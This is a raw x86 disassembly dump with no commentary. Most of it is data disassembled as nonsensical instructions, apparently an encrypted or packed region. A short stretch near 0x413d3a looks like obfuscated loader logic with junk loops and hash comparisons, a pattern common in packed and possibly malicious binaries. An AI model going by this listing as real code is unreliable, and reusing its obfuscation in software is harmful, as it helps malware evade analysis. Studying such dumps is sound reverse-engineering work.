  4138db:	cmp    ebp,DWORD PTR [eax]
  4138dd:	aaa    
  4138de:	add    ebp,DWORD PTR [ebp-0x4d]
  4138e1:	popf   
  4138e2:	cmp    al,BYTE PTR [esi+0x6a]
  4138e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e6:	adc    dh,BYTE PTR [esi-0x788fc0b]
  4138ec:	xchg   ecx,eax
  4138ed:	sub    DWORD PTR [esi-0x265ecc88],ecx
  4138f3:	inc    eax
  4138f4:	in     al,dx
  4138f5:	stos   BYTE PTR es:[edi],al
  4138f6:	cmp    bh,BYTE PTR [edx]
  4138f8:	inc    edx
  4138f9:	push   esp
  4138fa:	xchg   esi,eax
  4138fb:	sbb    edi,eax
  4138fd:	xor    eax,0x6e6822e
  413902:	es sti 
  413904:	hlt    
  413905:	push   ecx
  413906:	imul   ecx,edi,0x1607afe5
  41390c:	and    eax,0xecc1be7d
  413911:	or     eax,0xd73dc10c
  413916:	cli    
  413917:	ds dec ebx
  413919:	sbb    edi,edi
  41391b:	stos   BYTE PTR es:[edi],al
  41391c:	(bad)  
  41391d:	std    
  41391e:	push   ecx
  41391f:	mov    dl,0x6b
  413921:	push   ebp
  413922:	ficomp DWORD PTR [ebx+0x72]
  413925:	sar    DWORD PTR [eax+eiz*8+0x6c6e319c],1
  41392c:	xor    dh,dl
  41392e:	call   0x841f:0x356a76bf
  413935:	scas   al,BYTE PTR es:[di]
  413937:	into   
  413938:	ficomp DWORD PTR [ecx]
  41393a:	xlat   BYTE PTR ds:[ebx]
  41393b:	enter  0xa8c9,0x36
  41393f:	das    
  413940:	lods   eax,DWORD PTR ds:[esi]
  413941:	jp     0x413961
  413943:	fdivr  DWORD PTR [ebx+ebp*1]
  413946:	arpl   WORD PTR [eax-0x5f],sp
  413949:	add    esp,ecx
  41394b:	vshufps ymm3,ymm3,YMMWORD PTR [esi-0x3c43ab42],0x30
  413954:	cmp    al,0x20
  413956:	scas   al,BYTE PTR es:[edi]
  413957:	cmp    eax,0xf2325389
  41395c:	pop    edi
  41395d:	aas    
  41395e:	scas   eax,DWORD PTR es:[edi]
  41395f:	inc    ecx
  413960:	call   0xe585:0xefcb56f7
  413967:	ror    ch,1
  413969:	xchg   ebp,esp
  41396b:	dec    edi
  41396c:	jae    0x4139d7
  41396e:	outs   dx,DWORD PTR ds:[esi]
  41396f:	retf   0x9b23
  413972:	es mov al,0xe5
  413975:	cs int3 
  413977:	sbb    edx,esp
  413979:	mov    esi,DWORD PTR [ebp+0x3d2f3c5e]
  41397f:	mov    eax,ds:0xb169f09
  413984:	iret   
  413985:	adc    cl,BYTE PTR [esp+esi*4-0x2a7f3f39]
  41398c:	(bad)  
  41398f:	ins    BYTE PTR es:[edi],dx
  413990:	jmp    0x209:0x2f9e6914
  413997:	loop   0x41394e
  413999:	jno    0x413a0f
  41399b:	shl    BYTE PTR [edx+0x19],cl
  41399e:	outs   dx,DWORD PTR ds:[esi]
  41399f:	dec    eax
  4139a0:	aas    
  4139a1:	xchg   edx,eax
  4139a2:	xchg   ebx,eax
  4139a3:	push   ds
  4139a4:	ins    BYTE PTR es:[edi],dx
  4139a5:	jne    0x4139ce
  4139a7:	mov    edx,0xa1eb209f
  4139ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ad:	mov    dl,0x89
  4139af:	mov    ecx,0x9e202962
  4139b4:	push   esp
  4139b5:	clc    
  4139b6:	test   al,0x69
  4139b8:	xor    DWORD PTR [edx-0x6e314229],ebx
  4139be:	pop    ecx
  4139bf:	jmp    0x4139c0
  4139c1:	and    ah,BYTE PTR [edi+0x7c06149]
  4139c7:	jp     0x413984
  4139c9:	in     eax,0x56
  4139cb:	adc    ebp,DWORD PTR [ebp+0xeaa7e16]
  4139d1:	dec    edi
  4139d2:	fld    QWORD PTR [edi+eax*8]
  4139d5:	jmp    0xbe3d8ed7
  4139da:	push   0xffffffe3
  4139dc:	cmp    DWORD PTR [edi+0x2],esp
  4139df:	mov    bh,0x98
  4139e1:	sub    BYTE PTR [esi-0x38],ch
  4139e4:	mov    BYTE PTR [ecx+ebx*4-0x7ae35d07],ah
  4139eb:	ins    BYTE PTR es:[edi],dx
  4139ec:	repz adc al,0x4
  4139f0:	cmp    DWORD PTR [edi+ebx*8-0x8b4df36],esp
  4139f7:	and    DWORD PTR [edx],ecx
  4139f9:	jg     0x413a54
  4139fb:	pop    edx
  4139fc:	push   edx
  4139fd:	mov    ecx,gs
  4139ff:	sub    BYTE PTR [ebp+edx*4+0x11],bl
  413a03:	fidiv  DWORD PTR [ebp-0x5f80f63a]
  413a09:	mov    WORD PTR [ebx],es
  413a0b:	lods   eax,DWORD PTR ds:[esi]
  413a0c:	test   al,0xba
  413a0f:	xor    DWORD PTR [ecx-0x3164c86c],ebp
  413a15:	enter  0x6e8d,0x80
  413a19:	and    eax,0x35d515c3
  413a1e:	xor    eax,0xc4e00206
  413a23:	lods   al,BYTE PTR ds:[esi]
  413a24:	int    0x2
  413a26:	jge    0x413a07
  413a28:	mov    BYTE PTR [edi+0x719c9ea8],dl
  413a2e:	test   eax,0xd754cb72
  413a33:	test   al,0x33
  413a35:	cmp    eax,0xbebd484
  413a3a:	fisub  WORD PTR gs:[esi-0x72]
  413a3e:	call   0x1477:0x2e514d29
  413a45:	inc    ecx
  413a46:	sub    BYTE PTR [esi],cl
  413a48:	add    esp,DWORD PTR [edx-0x7]
  413a4b:	jle    0x413a74
  413a4d:	fwait
  413a4e:	loopne 0x413a58
  413a50:	mov    bl,0xe8
  413a52:	ja     0x413a11
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	dec    esp
  413a68:	sbb    cl,al
  413a6a:	out    0x7e,al
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	and    eax,DWORD PTR [edx+0x5e]
  413a76:	mov    DWORD PTR [edx],esp
  413a78:	loopne 0x413ace
  413a7a:	and    al,BYTE PTR [ebp+0x4d]
  413a7d:	fwait
  413a7e:	cld    
  413a7f:	or     ebp,DWORD PTR [edi-0x63]
  413a82:	aad    0xc4
  413a84:	adc    eax,DWORD PTR [eax+0x73f29af0]
  413a8a:	repz jmp 0x34b9e732
  413a90:	push   edx
  413a91:	xlat   BYTE PTR ds:[ebx]
  413a92:	mov    edx,fs
  413a94:	push   ds
  413a95:	mov    cl,0xf2
  413a97:	(bad)  
  413a98:	inc    edi
  413a99:	popa   
  413a9a:	stc    
  413a9b:	and    al,0x52
  413a9d:	imul   esi,DWORD PTR ds:0xc059338b,0xc0530e89
  413aa7:	inc    esp
  413aa8:	add    al,0xb0
  413aaa:	mov    esp,DWORD PTR [ecx+eiz*2]
  413aad:	push   esi
  413aae:	pop    esp
  413aaf:	outs   dx,DWORD PTR ds:[esi]
  413ab0:	inc    ebx
  413ab1:	aam    0xd6
  413ab3:	cmp    eax,0xebad3793
  413ab8:	sbb    BYTE PTR [eax],bl
  413aba:	xchg   edi,eax
  413abb:	stos   BYTE PTR es:[edi],al
  413abc:	push   esi
  413abd:	shr    BYTE PTR [ecx],1
  413abf:	pusha  
  413ac0:	ins    DWORD PTR es:[edi],dx
  413ac1:	xchg   esi,eax
  413ac2:	push   ebp
  413ac3:	lock shl edi,cl
  413ac6:	mov    ah,0x2c
  413ac8:	add    al,0x5b
  413aca:	ja     0x413a56
  413acc:	addr16 sti 
  413ace:	scas   al,BYTE PTR es:[edi]
  413acf:	(bad)  [ecx+0x4e]
  413ad2:	cmp    ebx,DWORD PTR [ebx]
  413ad4:	(bad)  [esi]
  413ad6:	scas   al,BYTE PTR es:[edi]
  413ad7:	call   0x7f6f:0x2514fe62
  413ade:	xlat   BYTE PTR ds:[ebx]
  413adf:	jmp    FWORD PTR [esi-0x5265dc98]
  413ae5:	inc    esp
  413ae6:	push   0x35
  413ae8:	(bad)  
  413aea:	aad    0x69
  413aec:	outs   dx,BYTE PTR ds:[esi]
  413aed:	(bad)  
  413aef:	mov    BYTE PTR [edx-0xa138420],dh
  413af5:	std    
  413af6:	outs   dx,BYTE PTR ds:[esi]
  413af7:	sub    DWORD PTR [edx],0xdf63eb05
  413afd:	or     DWORD PTR [edi+edx*4-0x2f27a323],eax
  413b04:	out    dx,al
  413b05:	xchg   edx,eax
  413b06:	fistp  WORD PTR [esi-0x7560d7be]
  413b0c:	test   eax,0x9a63bd41
  413b11:	pusha  
  413b12:	ret    
  413b13:	lods   al,BYTE PTR ds:[esi]
  413b14:	add    eax,0x85186f39
  413b19:	pop    ebp
  413b1a:	cdq    
  413b1b:	out    0xd1,al
  413b1d:	mov    ah,0x33
  413b1f:	add    edx,edi
  413b21:	gs scas eax,DWORD PTR es:[edi]
  413b23:	test   BYTE PTR [ebp+0x1a],dl
  413b26:	test   BYTE PTR [ebp+eax*8+0x57c183d3],bl
  413b2d:	sahf   
  413b2e:	xor    BYTE PTR [ebx],bh
  413b30:	jbe    0x413acf
  413b32:	xchg   ecx,eax
  413b33:	mov    esp,0x9abfa671
  413b38:	popf   
  413b39:	(bad)  [edi]
  413b3b:	mov    ebp,0x7ea0fb9c
  413b40:	(bad)  
  413b41:	mov    esi,0xc96b9d9d
  413b46:	(bad)  
  413b47:	jmp    0x2ec1b6ee
  413b4c:	jb     0x413b8f
  413b4e:	dec    edx
  413b4f:	xor    al,0xe7
  413b51:	popf   
  413b52:	push   ss
  413b53:	in     eax,dx
  413b54:	bound  ebp,QWORD PTR [eax]
  413b56:	pop    esp
  413b57:	pop    ebx
  413b58:	sub    esp,DWORD PTR [ecx-0x37fb7891]
  413b5e:	adc    BYTE PTR [eax],dl
  413b60:	jbe    0x413ae9
  413b62:	lods   eax,DWORD PTR ds:[esi]
  413b63:	dec    edx
  413b64:	xor    eax,DWORD PTR [eax-0x6b]
  413b67:	addr16 aas 
  413b69:	or     ecx,DWORD PTR [eax-0x1f36ec53]
  413b6f:	out    0xda,al
  413b71:	jns    0x413bb9
  413b73:	mov    bh,0x8d
  413b75:	mov    edx,0xea9fd10d
  413b7a:	stos   BYTE PTR es:[edi],al
  413b7b:	hlt    
  413b7c:	dec    edi
  413b7d:	xchg   esp,eax
  413b7e:	sar    DWORD PTR ds:0x9d595dcd,0x9
  413b85:	fist   DWORD PTR [ecx]
  413b87:	(bad)  [edi-0x70]
  413b8a:	pop    esi
  413b8b:	dec    ebx
  413b8c:	lea    ecx,[edi]
  413b8e:	out    0x7d,eax
  413b90:	mov    ebp,0x63bccf42
  413b95:	rcr    DWORD PTR [ebp+eiz*1-0x71c8c393],1
  413b9c:	and    al,0xd1
  413b9f:	pop    ds
  413ba0:	or     edi,DWORD PTR [ebp+0x23994d16]
  413ba6:	test   eax,0x3e53c6e2
  413bab:	add    al,bh
  413bad:	xor    DWORD PTR [ecx+0xdcce15b],ebp
  413bb3:	arpl   WORD PTR gs:[eax],sp
  413bb6:	shr    cl,1
  413bb8:	inc    eax
  413bb9:	ins    BYTE PTR es:[edi],dx
  413bba:	jge    0x413be6
  413bbc:	or     eax,0xe9e8a925
  413bc1:	addr16 mov bh,0x36
  413bc4:	lods   eax,DWORD PTR ds:[esi]
  413bc5:	fmul   QWORD PTR [edi-0x1476c8d]
  413bcb:	imul   eax,DWORD PTR [ebp+0x48],0x85daaf64
  413bd2:	jl     0x413c36
  413bd4:	lahf   
  413bd5:	xor    DWORD PTR [esi+esi*1+0x7fb2f5fd],0x2ca97380
  413be0:	lods   eax,DWORD PTR ds:[esi]
  413be1:	xchg   DWORD PTR [edi+0x57],edi
  413be4:	xchg   esi,eax
  413be5:	or     esi,0x65
  413be8:	repnz mov ebx,0xd978d34b
  413bee:	adc    al,0xee
  413bf0:	pop    ss
  413bf1:	mov    ecx,edi
  413bf3:	xor    ah,BYTE PTR [edi-0xcbe3b76]
  413bf9:	cmp    edi,DWORD PTR [edx+edi*1-0x73828d80]
  413c00:	ret    0x160d
  413c03:	push   esp
  413c04:	push   edx
  413c05:	and    BYTE PTR [ecx],bl
  413c07:	out    0xef,al
  413c09:	adc    DWORD PTR [bx],edi
  413c0c:	icebp  
  413c0d:	call   0x36d4f5d0
  413c12:	pop    esi
  413c13:	stos   DWORD PTR es:[edi],eax
  413c14:	(bad)  
  413c16:	hlt    
  413c17:	in     eax,dx
  413c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c19:	sahf   
  413c1a:	not    bl
  413c1c:	sub    ebp,DWORD PTR [edi]
  413c1e:	push   edi
  413c1f:	int    0x8e
  413c21:	arpl   WORD PTR [esi+0x35],sp
  413c24:	mov    bh,0x8b
  413c26:	mov    esi,0x28d059ee
  413c2b:	xchg   edi,eax
  413c2c:	mov    edx,0xe36370b8
  413c31:	arpl   WORD PTR [eax],di
  413c33:	mov    ebp,ebx
  413c35:	xchg   ecx,eax
  413c36:	sahf   
  413c37:	adc    esi,DWORD PTR [edi+0x7e4c7377]
  413c3d:	mov    ebx,0xf47f7632
  413c42:	inc    esi
  413c43:	sub    al,dh
  413c45:	leave  
  413c46:	sbb    esp,ecx
  413c48:	out    0x6f,eax
  413c4a:	xchg   esi,eax
  413c4b:	mov    ds:0x9fc4c5ef,eax
  413c50:	inc    esi
  413c51:	pushf  
  413c52:	and    al,0x23
  413c54:	pop    edx
  413c55:	mov    bh,0xd5
  413c57:	adc    eax,0xa469b8f7
  413c5c:	neg    DWORD PTR [ebx+edx*4-0x4]
  413c60:	jne    0x413ca1
  413c62:	iret   
  413c63:	fadd   QWORD PTR [edi-0x30]
  413c66:	ret    0xa7a9
  413c69:	nop
  413c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c6c:	jg     0x413c9c
  413c6e:	int    0x4e
  413c70:	mov    ebx,0x2c132116
  413c75:	fs jecxz 0x413cb8
  413c78:	scas   al,BYTE PTR es:[edi]
  413c79:	mov    edx,0x8dc92767
  413c7e:	dec    esi
  413c7f:	jbe    0x413cf3
  413c81:	sbb    esp,DWORD PTR [edi-0x2b385ca4]
  413c87:	jne    0x413c49
  413c89:	cmp    dl,BYTE PTR [eax]
  413c8b:	mov    ah,0x8a
  413c8d:	jbe    0x413cea
  413c8f:	sub    BYTE PTR [edx],al
  413c91:	popf   
  413c92:	jns    0x413c3a
  413c94:	push   edx
  413c95:	and    edi,DWORD PTR [ebx]
  413c97:	pop    ecx
  413c98:	or     bh,ch
  413c9a:	push   esi
  413c9b:	cdq    
  413c9c:	lods   al,BYTE PTR ds:[esi]
  413c9d:	test   cl,0xe4
  413ca0:	dec    eax
  413ca1:	fimul  WORD PTR [ecx]
  413ca3:	jle    0x413d0f
  413ca5:	adc    edx,edi
  413ca7:	adc    ecx,ecx
  413ca9:	or     ch,BYTE PTR [edx+0x6773a872]
  413caf:	nop
  413cb0:	adc    ah,bh
  413cb2:	dec    ebx
  413cb3:	cmp    eax,0x1b4fcc6d
  413cb8:	test   al,0xa9
  413cba:	jo     0x413c41
  413cbc:	cld    
  413cbd:	out    dx,al
  413cbe:	mov    DWORD PTR [esi-0x40],esp
  413cc1:	loopne 0x413c70
  413cc3:	pop    ebx
  413cc4:	outs   dx,BYTE PTR ds:[esi]
  413cc5:	sbb    ebp,edx
  413cc7:	shr    ecx,cl
  413cc9:	push   cs
  413cca:	push   0x51
  413ccc:	cmp    eax,0xf5f2f6b0
  413cd1:	pop    esp
  413cd2:	or     BYTE PTR [edx+0x22ec54cd],0x81
  413cd9:	mov    ch,0x7f
  413cdb:	cwde   
  413cdc:	lods   al,BYTE PTR ds:[esi]
  413cdd:	retf   
  413cde:	sbb    ebx,eax
  413ce0:	pop    es
  413ce1:	in     al,0xb4
  413ce3:	xor    DWORD PTR [ebx+esi*1+0x6d72124a],eax
  413cea:	nop
  413ceb:	leave  
  413cec:	or     DWORD PTR [edi+0x14dbcf44],0xffffffa2
  413cf3:	shl    BYTE PTR [esp+ebp*1+0x7e],1
  413cf7:	iret   
  413cf8:	js     0x413cdb
  413cfa:	xchg   BYTE PTR [ecx+0x62],bl
  413cfd:	in     al,dx
  413cfe:	xchg   edx,eax
  413cff:	(bad)  
  413d00:	sbb    BYTE PTR [edi+0x23234b51],cl
  413d06:	dec    ecx
  413d07:	ins    DWORD PTR es:[edi],dx
  413d08:	push   esp
  413d09:	pushf  
  413d0a:	out    0xc5,eax
  413d0c:	sbb    cl,BYTE PTR ss:[esi+0x7a]
  413d10:	pop    ebx
  413d11:	jne    0x413d73
  413d13:	(bad)  
  413d14:	jno    0x413d89
  413d16:	fld    DWORD PTR [ebx+0x71]
  413d19:	bound  ebp,QWORD PTR [ecx+0x5e]
  413d1c:	loopne 0x413d86
  413d1e:	jl     0x413d02
  413d20:	and    esp,DWORD PTR [ecx-0xb1d63c1]
  413d26:	(bad)  
  413d27:	mov    ch,0xeb
  413d29:	adc    eax,0xffae62b4
  413d2e:	mov    ebp,0x4d6fc17c
  413d33:	pop    ss
  413d34:	pushf  
  413d35:	adc    esi,ecx
  413d37:	pop    eax
  413d38:	mov    ch,0x80
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e67f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e67f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e67f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e4eb
  413d7f:	cmp    DWORD PTR ds:0x42e67f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e67f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e67f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e67f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e67f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e68f,0x42fd06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e0ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e677
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fc59,0x42e0a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e67b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e67b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e67b,eax
  413e08:	cmp    DWORD PTR ds:0x42e67b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e67b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e40b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fc81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e677,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e683
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e09c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e67b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	pop    ds
  413e8c:	adc    eax,0x764744f0
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0xfc70707e
  413e98:	imul   edx,DWORD PTR [esi+0x72],0xffffff89
  413e9c:	xchg   edx,eax
  413e9d:	in     al,0x28
  413e9f:	mov    dl,dh
  413ea1:	jae    0x413f17
  413ea3:	sub    ecx,DWORD PTR [esi]
  413ea5:	pop    ss
  413ea6:	cmp    al,0xfe
  413ea8:	jp     0x413e9e
  413eaa:	in     al,0x40
  413eac:	(bad)  
  413ead:	shl    DWORD PTR [ebp-0x419841bf],cl
  413eb3:	aad    0x43
  413eb5:	jp     0x413f1a
  413eb7:	retf   0x4167
  413eba:	ret    0x38ce
  413ebd:	rol    DWORD PTR [edx-0x737f61ce],1
  413ec3:	inc    edi
  413ec4:	loop   0x413e6b
  413ec6:	mov    esi,0xae5f6c03
  413ecb:	xor    al,0xc6
  413ecd:	out    0x86,al
  413ecf:	or     BYTE PTR [ecx+0x5a2d00d7],dh
  413ed5:	inc    esi
  413ed6:	xchg   esi,ecx
  413ed8:	jmp    0x413f27
  413eda:	cli    
  413edb:	cdq    
  413edc:	into   
  413edd:	inc    ecx
  413ede:	dec    ebx
  413edf:	mov    ecx,ecx
  413ee1:	je     0x413e69
  413ee3:	mov    eax,ds:0x1a821082
  413ee8:	mov    dl,0x38
  413eea:	ds xor eax,0x74baee91
  413ef0:	add    DWORD PTR cs:[edx+edx*8],0xfffffffb
  413ef5:	fdivr  st,st(5)
  413ef7:	loop   0x413f78
  413ef9:	int    0x5e
  413efb:	adc    DWORD PTR [esi+0x3c],ebx
  413efe:	mov    edx,0xcf3c6e09
  413f03:	xor    eax,0x5d32e1b7
  413f08:	mov    eax,ds:0x8d40e5b6
  413f0d:	leave  
  413f0e:	pop    ebp
  413f0f:	or     al,dh
  413f11:	inc    esp
  413f12:	fwait
  413f13:	scas   al,BYTE PTR es:[edi]
  413f14:	jp     0x413ec0
  413f16:	pop    edi
  413f17:	call   0x5b52:0x14baa25a
  413f1e:	push   ss
  413f1f:	aam    0x24
  413f21:	lods   eax,DWORD PTR ds:[esi]
  413f22:	sbb    eax,ebp
  413f24:	mov    ds,WORD PTR [esi+0x6c]
  413f27:	mov    dl,0x2b
  413f29:	cmp    bl,BYTE PTR [ebx]
  413f2b:	or     edx,DWORD PTR [esi+0x3d2fef0b]
  413f31:	data16 out 0xf8,al
  413f34:	push   ebx
  413f35:	enter  0x341,0x54
  413f39:	mov    ?,edx
  413f3b:	and    bl,bh
  413f3d:	jno    0x413f6b
  413f3f:	in     eax,dx
  413f40:	ds adc bh,dl
  413f43:	pop    ss
  413f44:	xor    al,0xb8
  413f46:	iret   
  413f47:	sbb    DWORD PTR ds:0x35c52345,esp
  413f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f4e:	or     eax,0x3cadd9ae
  413f53:	dec    ebx
  413f54:	xor    bh,BYTE PTR [esi+0x401c3b3d]
  413f5a:	shl    BYTE PTR [eax+0x5ea8ab52],1
  413f60:	push   es
  413f61:	cld    
  413f62:	and    edi,edx
  413f64:	fimul  WORD PTR [ebx]
  413f66:	ret    0x82c4
  413f69:	stos   DWORD PTR es:[edi],eax
  413f6a:	cmp    ebx,ebp
  413f6c:	mov    BYTE PTR [ebx-0xb],bl
  413f6f:	jno    0x413f77
  413f71:	lock sub edx,DWORD PTR [edx]
  413f74:	stos   BYTE PTR es:[edi],al
  413f75:	(bad)  
  413f76:	pop    edi
  413f77:	daa    
  413f78:	xchg   DWORD PTR [ebx+0x3e],ebp
  413f7b:	lahf   
  413f7c:	imul   edx,DWORD PTR [ecx-0x201ec24d],0x581768b7
  413f86:	es aaa 
  413f88:	leave  
  413f89:	push   es
  413f8a:	xchg   BYTE PTR [edi+0x4df08c2e],al
  413f90:	mov    gs,WORD PTR [esi]
  413f92:	sbb    dl,ah
  413f94:	push   eax
  413f95:	cmp    DWORD PTR [ebx-0x61],ebx
  413f98:	ins    BYTE PTR es:[edi],dx
  413f99:	shl    BYTE PTR [eax+0x6f0e351d],1
  413f9f:	bound  eax,QWORD PTR [esi]
  413fa1:	cmp    ecx,eax
  413fa3:	mov    eax,ds:0x2741bd74
  413fa8:	sbb    eax,0xa8ae193c
  413fad:	mov    ecx,0x60546458
  413fb2:	push   eax
  413fb3:	mov    esi,0x3c810d57
  413fb8:	jno    0x413f56
  413fba:	push   0x51d6e777
  413fbf:	xor    ah,BYTE PTR [edx]
  413fc1:	call   0xb2e48b46
  413fc6:	loope  0x413f94
  413fc8:	in     eax,dx
  413fc9:	fld    TBYTE PTR [eax+0x21]
  413fcc:	inc    edx
  413fcd:	sar    DWORD PTR [edi+0x12],1
  413fd0:	push   eax
  413fd1:	jmp    0x414052
  413fd3:	mov    bh,0xe9
  413fd5:	add    edi,DWORD PTR [esi+0x1bbaff55]
  413fdb:	inc    ebp
  413fdc:	or     esi,DWORD PTR [ebx-0xd]
  413fdf:	leave  
  413fe0:	xor    cl,al
  413fe2:	loop   0x413f65
  413fe4:	popf   
  413fe5:	sti    
  413fe6:	dec    esi
  413fe7:	jg     0x413fea
  413fe9:	fld    DWORD PTR [ebx]
  413feb:	inc    edi
  413fec:	xchg   esi,eax
  413fed:	mov    eax,0x4b3dce35
  413ff2:	mov    ah,0x3c
  413ff4:	xor    BYTE PTR [esi],cl
  413ff6:	in     al,dx
  413ff7:	ret    0xdff6
  413ffa:	(bad)  
  413ffb:	pop    eax
  413ffc:	loop   0x413fcd
  413ffe:	pop    esp
  413fff:	fistp  DWORD PTR [ecx-0x64]
  414002:	sbb    esp,edi
  414004:	sbb    BYTE PTR [eax+0x7e],bl
  414007:	push   ss
  414008:	imul   esp,DWORD PTR [ecx+0x4c],0x7285cfc3
  41400f:	adc    eax,0x45f5c42a
  414014:	push   cs
  414015:	aaa    
  414016:	and    eax,0x7063ca8e
  41401b:	cmp    ebp,DWORD PTR [edi+0x8313652]
  414021:	sbb    BYTE PTR [ebx+0x217f1d78],bl
  414027:	pop    eax
  414028:	fisub  DWORD PTR gs:[edx+eax*2]
  41402c:	push   0xffffff86
  41402e:	xchg   esp,edx
  414030:	mov    edx,0x83f9f6b4
  414035:	add    DWORD PTR [ebp+ecx*1+0x6a],esi
  414039:	lahf   
  41403a:	xor    al,0xb8
  41403c:	fidivr WORD PTR [eax-0x6298fd15]
  414042:	mov    ah,0xf
  414044:	or     BYTE PTR [edx+edi*8-0x1decafa],dl
  41404b:	repnz jecxz 0x413fd1
  41404e:	dec    eax
  41404f:	and    edx,DWORD PTR [eax]
  414051:	sub    esp,DWORD PTR [edx+0x15]
  414054:	jl     0x414062
  414056:	out    0x9c,eax
  414058:	fs jmp 0x578b7591
  41405e:	cmp    ecx,ebp
  414060:	pop    ebx
  414061:	mov    ds:0xd11ea961,eax
  414066:	pop    edi
  414067:	fist   DWORD PTR [ebp-0x4a]
  41406a:	addr16 dec eax
  41406c:	in     al,dx
  41406d:	dec    ecx
  41406e:	retf   
  41406f:	add    DWORD PTR [ebp+esi*1+0x236ac9e6],0xffffff84
  414077:	mov    ch,BYTE PTR [eax-0x581f4e72]
  41407d:	mov    esi,0xe9acc275
  414082:	in     eax,0xc5
  414084:	sti    
  414085:	sbb    cl,BYTE PTR [edx+0xa09269b]
  41408b:	add    bh,dh
  41408d:	sti    
  41408e:	sub    ch,BYTE PTR [ebx+0x5b]
  414091:	dec    ecx
  414092:	jmp    0x6ac3:0xb671ec5
  414099:	push   eax
  41409a:	clc    
  41409b:	add    ebx,DWORD PTR [eax]
  41409d:	add    dl,ah
  41409f:	fcom   QWORD PTR ds:0xfde6b4db
  4140a5:	xchg   ecx,eax
  4140a6:	stos   DWORD PTR es:[edi],eax
  4140a7:	aaa    
  4140a8:	packsswb mm2,QWORD PTR [ebx+0x74]
  4140ac:	xor    DWORD PTR [edi],esi
  4140ae:	(bad)  
  4140af:	ret    
  4140b0:	idiv   ebp
  4140b2:	scas   al,BYTE PTR es:[edi]
  4140b3:	jno    0x414064
  4140b5:	in     eax,0x61
  4140b7:	pop    es
  4140b8:	add    ecx,DWORD PTR [edi+0x33ca0555]
  4140be:	mov    esp,0xa535cde4
  4140c3:	daa    
  4140c4:	(bad)  
  4140c5:	lea    esi,[esi]
  4140c7:	in     eax,0xc0
  4140c9:	inc    edx
  4140ca:	mov    ebp,edx
  4140cc:	arpl   WORD PTR [edx+0x3b89ec98],bp
  4140d2:	jns    0x41405a
  4140d4:	jo     0x4140c8
  4140d6:	retf   
  4140d7:	icebp  
  4140d8:	mov    al,0x96
  4140da:	mov    ds:0xb277aca,al
  4140df:	add    al,0x3b
  4140e1:	jmp    0x6c8b:0xbd609af4
  4140e8:	fwait
  4140e9:	mov    dl,0xe7
  4140eb:	lahf   
  4140ec:	aad    0x6a
  4140ee:	test   eax,0x637526e7
  4140f3:	lds    esp,FWORD PTR [esi]
  4140f5:	rcl    DWORD PTR [esi],1
  4140f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f8:	pop    ebx
  4140f9:	or     BYTE PTR [edi],ch
